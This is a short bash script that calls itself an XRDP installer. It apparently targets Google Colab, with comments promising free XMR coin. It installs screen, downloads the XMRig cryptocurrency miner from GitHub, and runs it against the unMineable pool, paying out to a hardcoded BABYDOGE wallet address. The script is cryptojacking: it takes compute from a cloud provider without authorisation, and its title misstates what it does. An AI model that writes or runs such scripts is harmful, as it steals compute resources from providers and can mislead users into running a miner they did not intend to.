#! /bin/bash
# Install XRDP
# Before get xmr coin for free
# Google Colab
sudo apt update
clear
sudo apt install screen
screen -R xmr
 
wget https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-linux-x64.tar.gz
tar -xf xmrig-6.16.4-linux-x64.tar.gz
cd xmrig-6.16.4
./xmrig -o rx.unmineable.com:3333 -a rx -k -u BABYDOGE:0x8837dfc0bf0797e47dbd8a715c2d8f08e82e1ff1.Biugt1tot
